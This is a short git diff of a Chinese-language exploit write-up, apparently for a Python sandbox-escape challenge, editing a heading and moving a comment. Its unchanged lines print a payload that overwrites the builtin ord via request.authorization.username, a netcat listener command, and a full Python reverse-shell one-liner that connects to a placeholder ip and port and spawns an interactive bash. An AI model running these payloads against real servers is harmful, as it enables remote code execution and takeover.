@@ -48,9 +48,10 @@ for v in ss:
 
 ```
 
-2. 覆盖ord
+2. 覆盖ord和设置字符集
 
 ```python
+# 修改 authorization.username
 cmd = '__builtins__.__dict__[ord.__name__]=request.authorization.username.count'
 ```
 
@@ -59,7 +60,6 @@ cmd = '__builtins__.__dict__[ord.__name__]=request.authorization.username.count'
 服务器：nc -lvvp port
 
 ```python
-# 修改 authorization.username
 cmd = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
